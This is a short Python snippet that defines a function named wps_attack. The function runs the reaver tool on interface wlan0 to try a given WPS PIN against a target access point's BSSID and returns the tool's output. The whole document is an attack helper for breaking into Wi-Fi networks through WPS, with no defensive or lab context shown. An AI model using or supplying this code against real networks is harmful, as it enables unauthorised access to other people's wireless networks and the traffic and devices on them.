import subprocess

def wps_attack(bssid, pin):
    try:
        result = subprocess.run(['reaver', '-i', 'wlan0', '-b', bssid, '-p', pin], capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        return str(e)
